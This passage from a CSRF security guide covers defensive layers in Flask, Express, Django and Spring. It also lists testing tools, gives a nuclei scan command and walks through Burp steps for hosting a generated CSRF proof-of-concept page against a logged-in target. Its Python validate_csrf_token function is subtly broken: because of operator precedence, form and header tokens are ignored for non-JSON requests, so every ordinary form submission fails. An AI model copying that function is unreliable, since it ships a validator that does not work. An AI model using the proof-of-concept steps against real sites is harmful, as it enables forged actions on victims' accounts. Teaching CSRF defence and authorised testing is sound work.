def validate_csrf_token() -> bool:
    """Validate CSRF token using constant-time comparison"""
    session_token = session.get('csrf_token', '')
    request_token = (
        request.form.get('csrf_token') or
        request.headers.get('X-CSRF-Token') or
        request.json.get('csrf_token') if request.is_json else None
    )
    if not request_token or not session_token:
        return False
    # Constant-time comparison prevents timing attacks
    return hmac.compare_digest(session_token, request_token)

def csrf_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if request.method in ('POST', 'PUT', 'PATCH', 'DELETE'):
            if not validate_csrf_token():
                abort(403, "CSRF token invalid or missing")
        return f(*args, **kwargs)
    return decorated
```

#### Layer 2: SameSite Cookie Attribute

```python:secure

# Set SameSite on session cookie at the framework level
app.config.update(
    SESSION_COOKIE_SAMESITE = 'Lax',     # or 'Strict' for maximum protection
    SESSION_COOKIE_HTTPONLY = True,       # Prevent JS access to session cookie
    SESSION_COOKIE_SECURE   = True,       # HTTPS only
    SESSION_COOKIE_NAME     = '__Host-session',  # __Host- prefix for extra security
)
```

```http

# Ideal Set-Cookie header
Set-Cookie: __Host-session=abc123;
            Path=/;
            Secure;
            HttpOnly;
            SameSite=Lax
```

#### Layer 3: Origin / Referer Validation

```python:secure

from urllib.parse import urlparse

ALLOWED_ORIGINS = frozenset({
    'https://target.com',
    'https://app.target.com',
    'https://www.target.com',
})

def check_origin(request) -> bool:
    origin  = request.headers.get('Origin')
    referer = request.headers.get('Referer')

    if origin:
        return origin in ALLOWED_ORIGINS

    if referer:
        parsed  = urlparse(referer)
        origin  = f"{parsed.scheme}://{parsed.netloc}"
        return origin in ALLOWED_ORIGINS

    # Fail closed — reject if neither header present
    return False
```

#### Layer 4: Double Submit Cookie Pattern (Stateless APIs)

```javascript:secure

// For stateless APIs that can't use server-side sessions
// Generate random token, store in both cookie and request parameter
// Server verifies they match (attacker cannot read victim's cookies)

// Server: set CSRF cookie on login
res.cookie('csrf_token', crypto.randomBytes(32).toString('hex'), {
    httpOnly: false,    // Must be readable by JS to include in request
    secure: true,
    sameSite: 'Strict'
});

// Client: read cookie and add to every state-changing request
function getCsrfToken() {
    return document.cookie
        .split('; ')
        .find(row => row.startsWith('csrf_token='))
        ?.split('=')[1] || '';
}

// Axios interceptor — automatically add CSRF token to all requests
axios.interceptors.request.use(config => {
    if (['post', 'put', 'patch', 'delete'].includes(config.method)) {
        config.headers['X-CSRF-Token'] = getCsrfToken();
    }
    return config;
});

// Server: validate cookie == header
app.use((req, res, next) => {
    if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(req.method)) {
        const cookieToken  = req.cookies.csrf_token;
        const headerToken  = req.headers['x-csrf-token'];
        if (!cookieToken || cookieToken !== headerToken) {
            return res.status(403).json({ error: 'CSRF validation failed' });
        }
    }
    next();
});
```

#### Layer 5: Framework-Specific Implementations

```python:secure

# Django — built-in CSRF protection (always enabled by default)
# settings.py
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',   # Keep this enabled
    ...
]

# In templates — always include the tag
# {% csrf_token %}

# For AJAX — read from cookie
# X-CSRFToken: getCookie('csrftoken')
```

```javascript:secure

// Express — using csurf middleware
const csurf   = require('csurf');
const cookieParser = require('cookie-parser');

app.use(cookieParser());

const csrfProtection = csurf({
    cookie: {
        httpOnly: true,
        secure: true,
        sameSite: 'strict'
    }
});

// Apply to all state-changing routes
app.use('/account', csrfProtection);
app.use('/api',     csrfProtection);

// Expose token to frontend
app.get('/csrf-token', csrfProtection, (req, res) => {
    res.json({ csrfToken: req.csrfToken() });
});
```

```java

// Spring Security — CSRF protection enabled by default
@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            )
            // Do NOT disable CSRF: .csrf().disable() — this removes all protection
            .authorizeRequests()
            .anyRequest().authenticated();
    }
}
```

---

## Tools & Resources

### Detection & Testing Tools

| Tool | Purpose | URL |
|------|---------|-----|
| Burp Suite | Intercept and generate CSRF PoC | https://portswigger.net/burp |
| CSRF PoC Generator | Burp's built-in "Generate CSRF PoC" | Built into Burp Suite Pro |
| nuclei | Template-based CSRF detection | https://github.com/projectdiscovery/nuclei |
| csrf-poc-generator | CLI tool for CSRF PoC generation | https://github.com/merttasci/csrf-poc-generator |
| katana | Spider applications to find endpoints | https://github.com/projectdiscovery/katana |
| ffuf | Fuzz endpoints for missing CSRF tokens | https://github.com/ffuf/ffuf |

### Useful nuclei Templates

```bash

# Scan for CSRF vulnerabilities
nuclei -u https://example.com \
       -t nuclei-templates/vulnerabilities/generic/csrf-detection.yaml \
       -t nuclei-templates/miscellaneous/missing-csrf-token.yaml \
       -t nuclei-templates/miscellaneous/samesite-cookie-missing.yaml
```

### Burp Suite — Generate CSRF PoC

```
1. Intercept a state-changing POST request in Burp
2. Right-click the request in HTTP History
3. Select: Engagement tools → Generate CSRF PoC
4. Burp generates a ready-to-host HTML PoC automatically
5. Click "Copy HTML" and host on your server
6. Test by visiting the page in a browser logged into the target
```

### Learning Resources

- **OWASP CSRF Prevention Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- **PortSwigger CSRF Labs**: https://portswigger.net/web-security/csrf
- **HackTricks CSRF**: https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery
- **PayloadsAllTheThings CSRF**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection

### Practice Labs

- **PortSwigger Web Academy**: CSRF — 12 guided labs covering all bypass techniques
- **DVWA**: CSRF module with low/medium/high security levels
- **WebGoat**: CSRF exercises with hints
- **HackTheBox**: Web challenges involving CSRF chains
- **TryHackMe**: "CSRF" and "Authentication Bypass" rooms

---

## Conclusion

CSRF remains one of the most impactful vulnerabilities in web security. Its power lies in abusing the browser's trust model — authenticated sessions carry cookies automatically, and the server cannot natively distinguish between intentional user actions and forged cross-origin requests.

Key takeaways:

1. **For Bug Bounty Hunters**: Test every state-changing endpoint — not just forms, but API endpoints, GraphQL mutations, and OAuth flows. Check if CSRF tokens are validated, session-tied, and cryptographically strong. CSRF chained with XSS or CORS misconfigurations can escalate to Critical severity.

2. **For Developers**: Implement CSRF tokens using the synchronizer pattern — generated with `secrets.token_hex(32)`, tied to the user session, and validated server-side with constant-time comparison. Supplement with `SameSite=Lax` or `Strict` cookies and Origin header validation. Never disable framework-level CSRF protection.

3. **For Everyone**: CSRF is silent and invisible to the victim. A single forged request can change passwords, transfer funds, or escalate privileges. Defense-in-depth combining tokens, SameSite cookies, and origin validation is the only reliable approach.

---

*This guide is a living document. Security evolves constantly, and new bypass techniques emerge regularly. Stay updated, practice on labs, and contribute to the security community.*

**Found this guide helpful?** Share it with your team and contribute your knowledge back to the community. If you find bugs using techniques from this guide, consider responsible disclosure.

---

*Published by KrazePlanet Security Research. For educational purposes only.*
